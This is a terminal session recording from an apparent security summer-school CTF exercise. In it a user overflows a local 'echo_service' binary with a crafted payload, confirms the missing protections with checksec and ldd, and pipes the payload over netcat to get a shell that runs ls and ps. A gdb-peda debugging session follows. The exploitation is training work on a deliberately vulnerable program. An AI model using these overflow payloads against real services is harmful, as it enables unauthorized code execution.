@@ -1,0 +1,572 @@
+Script started on Sat 25 Jul 2015 12:25:56 AM EEST
+]0;razvan@einherjar: ~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-servicerazvan@einherjar:~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service$ echo "na[K[K[K[K[K[K[K[Knc localhost 7000
+==============================================
+Welcome to the Echo service
+==============================================
+For your free trial, we will only echo 1024 bytes back to you
+If you need more, contact our sales representatives at legit_services@lol.cat
+anaaremere
+Got it! Here it is:
+anaaremere
+]0;razvan@einherjar: ~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-servicerazvan@einherjar:~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service$ nc localhost 7000[1@e[1@c[1@h[1@o[1@ [1@"[1@a[C[1@n[1@a[1P[1P[1P[1P[1P[1P[1P[1P[1P[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+==============================================
+Welcome to the Echo service
+==============================================
+For your free trial, we will only echo 1024 bytes back to you
+If you need more, contact our sales representatives at legit_services@lol.cat
+anaaremere
+Got it! Here it is:
+anaaremere
+]0;razvan@einherjar: ~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-servicerazvan@einherjar:~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service$ nc localhost 7000
+localhost [127.0.0.1] 7000 (afs3-fileserver) : Connection refused
+]0;razvan@einherjar: ~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-servicerazvan@einherjar:~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service$ nc localhost 7000
+==============================================
+Welcome to the Echo service
+==============================================
+For your free trial, we will only echo 1024 bytes back to you
+If you need more, contact our sales representatives at legit_services@lol.cat
+AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%nA%SA%oA%TA%pA%UA%qA%VA%rA%WA%sA%XA%tA%YA%uA%ZA%vA%wA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsnAsSAsoAsTAspAsUAsqAsVAsrAsWAssAsXAstAsYAsuAsZAsvAswAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiAB8ABNABjAB9ABOABkABPABlABQABmABRABnABSABoABTABpABUABqABVABrABWABsABXABtABYABuABZABvABwABxAByABzA$%A$sA$BA$$A$nA$CA$-A$(A$DA$;A$)A$EA$aA$0A$FA$bA$1A$GA$cA$2A$HA$dA$3A$IA$eA$4A$JA$fA$5A$KA$gA$6A$LA$hA$7A$MA$iA$8A$NA$jA$9A$OA$kA$PA$lA$QA$mA$RA$nA$SA$oA$TA$pA$UA$qA$VA$rA$WA$sA$XA$tA$YA$uA$ZA$vA$wA$xA$yA$zAn%AnsAnBAn$AnnAnCAn-An(AnDAn;An)AnEAnaAn0AnFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnnAnSAnoAnTAnpAnUAnqAnVAnrAnWAnsAnXAntAnYAnuAnZAnvAnwAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(ACDAC;AC)ACEACaAC0ACFACbAC1ACGACcAC2ACHACdAC3ACIACeAC4ACJACfAC5ACKACgAC6ACLAChAC7ACMACiAC8ACNACjAC9ACOACkACPAClACQACmACRACnACSACoACTACpACUACqACVACrACWACsACXACtACYACuACZACvACwACxACyACzA-%A-sA-BA-$A-nA-CA--A-(A-DA-;A-)A-EA-aA-0A-FA-bA-
+]0;razvan@einherjar: ~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-servicerazvan@einherjar:~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service$ python payload-no-aslr.py | xxd
+00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000020: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000030: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000040: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000050: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000060: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000070: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000080: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000090: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000000a0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000000b0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000000c0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000000d0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000000e0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000000f0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000100: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000110: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000120: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000130: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000140: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000150: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000160: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000170: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000180: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000190: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000001a0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000001b0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000001c0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000001d0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000001e0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000001f0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000200: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000210: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000220: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000230: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000240: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000250: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000260: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000270: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000280: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000290: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000002a0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000002b0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000002c0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000002d0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000002e0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000002f0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000300: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000310: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000320: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000330: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000340: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000350: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000360: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000370: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000380: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000390: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000003a0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000003b0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000003c0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000003d0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000003e0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000003f0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000400: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000410: f085 0408 6e8b 0408 0400 0000 0000 0000  ....n...........
+00000420: f085 0408 6e8b 0408 0400 0000 0100 0000  ....n...........
+00000430: 7086 0408 0000 0000 a961 f5b7            p........a..
+]0;razvan@einherjar: ~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-servicerazvan@einherjar:~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service$ che
+checkgid  cheese    chem      
+]0;razvan@einherjar: ~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-servicerazvan@einherjar:~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service$ chec[K[K[K[K~/bin/checksec.sh echo_service
+[31mError: Unknown option 'echo_service'.[m
+
+Usage: checksec [OPTION]
+
+Options:
+
+  --file <executable-file>
+  --dir <directory> [-v]
+  --proc <process name>
+  --proc-all
+  --proc-libs <process ID>
+  --kernel
+  --fortify-file <executable-file>
+  --fortify-proc <process ID>
+  --version
+  --help
+
+For more information, see:
+  http://www.trapkit.de/tools/checksec.html
+
+]0;razvan@einherjar: ~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-servicerazvan@einherjar:~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service$ ~/bin/checksec.sh echo_service-echo_service-echo_servicefecho_serviceiecho_servicelecho_service[Cecho_service echo_service
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+[33mPartial RELRO[m   [31mNo canary found[m   [32mNX enabled [m   [31mNo PIE       [m   [32mNo RPATH [m  [32mNo RUNPATH [m  echo_service
+]0;razvan@einherjar: ~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-servicerazvan@einherjar:~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service$ ldd echo_service
+	linux-gate.so.1 (0xf76f6000)
+	libc.so.6 => /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0xf7512000)
+	/lib/ld-linux.so.2 (0xf76f9000)
+]0;razvan@einherjar: ~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-servicerazvan@einherjar:~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service$ ldd echo_service
+	linux-gate.so.1 (0xf76e5000)
+	libc.so.6 => /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0xf7501000)
+	/lib/ld-linux.so.2 (0xf76e8000)
+]0;razvan@einherjar: ~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-servicerazvan@einherjar:~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service$ ldd echo_service
+	linux-gate.so.1 (0xf77b9000)
+	libc.so.6 => /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0xf75d5000)
+	/lib/ld-linux.so.2 (0xf77bc000)
+]0;razvan@einherjar: ~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-servicerazvan@einherjar:~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service$ python payload-no-aslr.py [K; cat)[1@)[1P[1@([C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C | netcat[K[K[K[K[Kct l[K[K[K localhost 7001
+==============================================
+Welcome to the Echo service
+==============================================
+For your free trial, we will only echo 1024 bytes back to you
+If you need more, contact our sales representatives at legit_services@lol.cat
+ls
+]0;razvan@einherjar: ~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-servicerazvan@einherjar:~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service$ (python payload-no-aslr.py; cat) | nc localhost 7001[K2
+==============================================
+Welcome to the Echo service
+==============================================
+For your free trial, we will only echo 1024 bytes back to you
+If you need more, contact our sales representatives at legit_services@lol.cat
+ls
+echo_service
+echo_service-rop.txt
+echo_service.c
+payload-aslr-alt.py
+payload-aslr.py
+payload-no-aslr.py
+peda-session-echo_service.txt
+ps
+  PID TTY          TIME CMD
+14269 pts/3    00:00:00 echo_service
+16413 pts/3    00:00:00 echo_service <defunct>
+18249 pts/3    00:00:00 bash
+21341 pts/3    00:00:00 echo_service
+21393 pts/3    00:00:00 echo_service
+21394 pts/3    00:00:00 sh
+21395 pts/3    00:00:00 sh
+21470 pts/3    00:00:00 ps
+26088 pts/3    00:00:00 echo_service
+26535 pts/3    00:00:00 echo_service <defunct>
+^C
+]0;razvan@einherjar: ~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-servicerazvan@einherjar:~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service$ ldd echo_service
+	linux-gate.so.1 (0xf7772000)
+	libc.so.6 => /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0xf758e000)
+	/lib/ld-linux.so.2 (0xf7775000)
+]0;razvan@einherjar: ~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-servicerazvan@einherjar:~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service$ ldd echo_service
+	linux-gate.so.1 (0xf778a000)
+	libc.so.6 => /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0xf75a6000)
+	/lib/ld-linux.so.2 (0xf778d000)
+]0;razvan@einherjar: ~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-servicerazvan@einherjar:~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service$ ./echo_service 7004
+^C
+]0;razvan@einherjar: ~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-servicerazvan@einherjar:~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service$ pkill -f[K9 -f echo_service
+]0;razvan@einherjar: ~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-servicerazvan@einherjar:~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service$ pkill -9 -f echo_service[5P./echo_service 7004[3Pldd echo_service(python payload-no-aslr.py; cat) | nc localhost 70021ldd echo_service[K[21@~/bin/checksec.sh --file[C[C[C[C[C[C[C[C[C[C[C[C[C[7Pecho_servicepython payload-no-aslr.py | xxd[14Pnc localhost 7000python payload-no-aslr.py | xxd[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1P[1P[1P
+00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000020: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000030: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000040: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000050: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000060: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000070: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000080: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000090: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000000a0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000000b0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000000c0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000000d0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000000e0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000000f0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000100: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000110: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000120: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000130: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000140: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000150: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000160: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000170: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000180: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000190: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000001a0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000001b0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000001c0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000001d0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000001e0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000001f0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000200: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000210: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000220: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000230: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000240: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000250: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000260: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000270: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000280: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000290: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000002a0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000002b0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000002c0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000002d0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000002e0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000002f0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000300: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000310: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000320: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000330: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000340: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000350: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000360: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000370: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000380: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000390: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000003a0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000003b0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000003c0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000003d0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000003e0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000003f0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000400: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000410: f085 0408 6e8b 0408 0400 0000 0000 0000  ....n...........
+00000420: f085 0408 6e8b 0408 0400 0000 0100 0000  ....n...........
+00000430: 0086 0408 6d8b 0408 0400 0000 60a0 0408  ....m.......`...
+00000440: 0800 0000 7086 0408 0000 0000 60a0 0408  ....p.......`...
+]0;razvan@einherjar: ~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-servicerazvan@einherjar:~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service$ ldd echo_service
+	linux-gate.so.1 (0xf7733000)
+	libc.so.6 => /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0xf754f000)
+	/lib/ld-linux.so.2 (0xf7736000)
+]0;razvan@einherjar: ~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-servicerazvan@einherjar:~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service$ ldd echo_service
+	linux-gate.so.1 (0xf775b000)
+	libc.so.6 => /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0xf7577000)
+	/lib/ld-linux.so.2 (0xf775e000)
+]0;razvan@einherjar: ~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-servicerazvan@einherjar:~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service$ pkill -98 [K[K -f echo_service
+]0;razvan@einherjar: ~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-servicerazvan@einherjar:~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service$ ./echo_service [1@g[1@f[1P[1@d[1@b[1@ [1@-[1@q[1@ 
+Reading symbols from ./echo_service...(no debugging symbols found)...done.
+[;31mgdb-peda$ [0mstart 7008
+[;34m[----------------------------------registers-----------------------------------][0m
+[m[;32mEAX[0m: 0x2 
+[;32mEBX[0m: [;34m0xf7f9d000[0m --> 0x1a5da8 
+[;32mECX[0m: 0xd12dc86a 
+[;32mEDX[0m: [;34m0xffffd344[0m --> [;34m0xf7f9d000[0m --> 0x1a5da8 
+[;32mESI[0m: 0x0 
+[;32mEDI[0m: 0x0 
+[;32mEBP[0m: [;34m0xffffd318[0m --> 0x0 
+[;32mESP[0m: [;34m0xffffd318[0m --> 0x0 
+[;32mEIP[0m: [;31m0x804891d[0m (<main+3>:	and    esp,0xfffffff0)[0m
+[m[;32mEFLAGS[0m: 0x246 ([;32mcarry[0m [;1;31mPARITY[0m [;32madjust[0m [;1;31mZERO[0m [;32msign[0m [;32mtrap[0m [;1;31mINTERRUPT[0m [;32mdirection[0m [;32moverflow[0m)[0m
+[m[;34m[-------------------------------------code-------------------------------------][0m[0m
+[m   0x8048919 <doprocessing+18>:[;2;34m	ret    [0m
+   0x804891a <main>:[;2m	push   ebp[0m
+   0x804891b <main+1>:[;2m	mov    ebp,esp[0m
+=> 0x804891d <main+3>:[;1;32m	and    esp,0xfffffff0[0m
+   0x8048920 <main+6>:[m	sub    esp,0x60[0m
+   0x8048923 <main+9>:[m	mov    DWORD PTR [esp+0x4c],0x1[0m
+   0x804892b <main+17>:[;31m	cmp    DWORD PTR [ebp+0x8],0x2[0m
+   0x804892f <main+21>:[;33m	je     0x8048952 <main+56>[0m[0m
+[m[;34m[------------------------------------stack-------------------------------------][0m[0m
+[m0000| [;34m0xffffd318[0m --> 0x0 [0m
+[m0004| [;34m0xffffd31c[0m --> [;31m0xf7e10a63[0m (<__libc_start_main+243>:	mov    DWORD PTR [esp],eax)[0m
+[m0008| [;34m0xffffd320[0m --> 0x2 [0m
+[m0012| [;34m0xffffd324[0m --> [;34m0xffffd3b4[0m --> [;34m0xffffd510[0m ("/home/razvan/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service/echo_service")[0m
+[m0016| [;34m0xffffd328[0m --> [;34m0xffffd3c0[0m --> [;34m0xffffd577[0m ("XDG_VTNR=7")[0m
+[m0020| [;34m0xffffd32c[0m --> [;31m0xf7feb7da[0m (add    ebx,0x11826)[0m
+[m0024| [;34m0xffffd330[0m --> 0x2 [0m
+[m0028| [;34m0xffffd334[0m --> [;34m0xffffd3b4[0m --> [;34m0xffffd510[0m ("/home/razvan/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service/echo_service")[0m
+[;34m[------------------------------------------------------------------------------][0m
+[mLegend: [;31mcode[0m, [;34mdata[0m, [;32mrodata[0m, value[0m
+
+Temporary breakpoint 1, 0x0804891d in main ()
+[;31mgdb-peda$ [0mc[Kb echo_srviceervice
+Breakpoint 2 at 0x8048857
+[;31mgdb-peda$ [0mc
+Continuing.
+[New process 1668]
+[Switching to process 1668]
+[;34m[----------------------------------registers-----------------------------------][0m
+[m[;32mEAX[0m: 0x4 
+[;32mEBX[0m: [;34m0xf7f9d000[0m --> 0x1a5da8 
+[;32mECX[0m: [;34m0xf7f9d000[0m --> 0x1a5da8 
+[;32mEDX[0m: [;34m0xf7f9d000[0m --> 0x1a5da8 
+[;32mESI[0m: 0x0 
+[;32mEDI[0m: 0x0 
+[;32mEBP[0m: [;34m0xffffd288[0m --> [;34m0xffffd2a8[0m --> [;34m0xffffd318[0m --> 0x0 
+[;32mESP[0m: [;34m0xffffce60[0m --> 0x34 ('4')
+[;32mEIP[0m: [;31m0x8048857[0m (<echo_service+9>:	mov    DWORD PTR [esp+0x4],0x8048ba0)[0m
+[m[;32mEFLAGS[0m: 0x286 ([;32mcarry[0m [;1;31mPARITY[0m [;32madjust[0m [;32mzero[0m [;1;31mSIGN[0m [;32mtrap[0m [;1;31mINTERRUPT[0m [;32mdirection[0m [;32moverflow[0m)[0m
+[m[;34m[-------------------------------------code-------------------------------------][0m[0m
+[m   0x804884e <echo_service>:[;2m	push   ebp[0m
+   0x804884f <echo_service+1>:[;2m	mov    ebp,esp[0m
+   0x8048851 <echo_service+3>:[;2m	sub    esp,0x428[0m
+=> 0x8048857 <echo_service+9>:[;1;32m	mov    DWORD PTR [esp+0x4],0x8048ba0[0m
+   0x804885f <echo_service+17>:[m	mov    eax,DWORD PTR [ebp+0x8][0m
+   0x8048862 <echo_service+20>:[m	mov    DWORD PTR [esp],eax[0m
+   0x8048865 <echo_service+23>:[;1;4;31m	call   0x8048630 <dprintf@plt>[0m
+   0x804886a <echo_service+28>:[m	mov    DWORD PTR [esp+0x4],0x8048bd0[0m[0m
+[m[;34m[------------------------------------stack-------------------------------------][0m[0m
+[m0000| [;34m0xffffce60[0m --> 0x34 ('4')[0m
